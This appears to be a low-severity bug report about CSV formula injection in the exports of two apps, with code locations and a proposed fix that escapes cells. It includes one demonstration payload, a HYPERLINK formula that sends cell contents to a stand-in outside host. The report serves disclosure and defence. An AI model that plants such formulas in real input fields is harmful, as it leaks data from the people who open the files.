Description: The CSV files the apps hand out - Celebrate's `invoices.csv` for admins, Who?'s list and invitation exports for members - write names a member or a ticket buyer typed as they are, so a name beginning `=` runs as a formula when the file is opened in a spreadsheet.
Status: open
Severity: low
---
`invoicesCSV` (`internal/celebrate/handlers.go:1707-1724`) writes `l.Guest`, a guest name of up to 120 characters typed at `buyTickets`, straight into the file an admin downloads. `csvField` (`web/who/dom.js:181-183`) quotes a field and nothing more, and feeds the exports in `web/who/pages/list.js` and `web/who/pages/invites.js` with preferred names a parent typed and guest names from Celebrate. The sheets themselves are safe: every write in `internal/data/sheet.go` is `RAW`.

A guest named `=HYPERLINK("https://elsewhere.example/?"&A1,"see invoice")` is the demonstration.

Fix: prefix `'` to a cell that starts with `=`, `+`, `-` or `@`, in `csvField` and in one helper `invoicesCSV` writes through.
